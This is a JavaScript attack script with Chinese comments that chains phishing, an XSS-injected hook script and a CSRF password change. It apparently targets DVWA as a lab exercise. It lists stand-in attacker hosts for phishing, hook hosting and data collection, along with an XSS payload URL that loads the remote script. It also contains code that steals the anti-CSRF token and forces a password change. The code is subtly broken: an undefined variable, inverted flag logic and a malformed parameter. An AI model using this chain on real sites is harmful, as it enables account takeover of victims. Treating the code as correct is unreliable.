/*
1. 诱导受害者访问钓鱼网站
2. 触发本地PC 下载hook.js 文件
3. 本地PC 运行hook.js 文件，获取包含动态token 的cookie
4. 利用包含动态token 的cookie 发起CSRF 攻击

http://target.vulhost.com/csrf.php # 目标站点
http://gofish.hack.net/index.jsp # 社工伪造钓鱼网站
http://hook.hack.net/xss_hook.js # hook 站点
http://collect.hack.net/xss_hook2email.php # 通过hook 站点收集信息的站点
*/

// 钓鱼网站包含超链接 http://hook.hack.net/hook_csrf.js // http://target.vulhost.com/csrf.php?id=<script src=http://hook.hack.net/hook_csrf.js></script>

function csrfAttack(url, pass) {
    if (window.XMLHttpRequest) {
        xmlhttp = new XMLHttpRequest();
    } else {
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.withCredentials = true;
    var hacked = false;
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            var regex = /user_token\'value\=\'(.*?)\'\/\>/;
            var match = text.match(regex);
            var token = match[1];
            var newUrl = url + "?user_token=" + token + "&password_new" + pass + "&password_conf=" + pass + "&Change=Changge"
            if (hacked) {
                alert("Got token: " + match[1]);
                hacked = true;
                xmlhttp.open("GET", newUrl, false);
                xmlhttp.send();
            }
        }
    };
    xmlhttp.open("GET", url, false);
    xmlhttp.send();
}

alert(document.cookie);
var url = "http://target.vulhost.com/csrf/"; // 目标站点
var pass = "password";

csrfAttack(url, pass);

/*
alert(document.cookie);

var url = "http://www.dvwa.com/vulnerabilities/csrf/";
var pass = "password";
if (window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
} else {
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.withCredentials = true;
var hacked = false;
xmlhttp.onreadystatechange = function () {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
        var regex = /user_token\'value\=\'(.*?)\'\/\>/;
        var match = text.match(regex);
        var token = match[1];
        var newUrl = url + "?user_token=" + token + "&password_new" + pass + "&password_conf=" + pass + "&Change=Changge"
        if (hacked) {
            alert("Got token: " + match[1]);
            hacked = true;
            xmlhttp.open("GET", newUrl, false);
            xmlhttp.send();
        }
    }
};

xmlhttp.open("GET", url, false);
xmlhttp.send();

*/


